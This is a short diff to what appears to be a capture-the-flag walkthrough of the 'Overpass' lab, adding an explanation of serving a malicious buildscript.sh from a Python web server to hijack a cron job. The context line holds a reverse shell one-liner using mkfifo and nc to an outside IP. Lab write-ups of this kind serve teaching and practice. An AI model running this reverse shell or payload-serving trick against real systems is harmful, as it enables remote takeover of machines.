@@ -719,6 +719,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.157.156 1234 >/t
 
 Start a python **webserver**: Start a simple Python HTTP server on the standard HTTP port (`**Port 80**`) from the root directory of the payload (`~/.../Overpass/`).
 
+> You needed the web server (Port 80) to impersonate the legitimate `overpass.thm` server and successfully serve the malicious `buildscript.sh` payload when the cron job requested it.
+
 Command: `python3 -m http.server 80`
 
 Output:
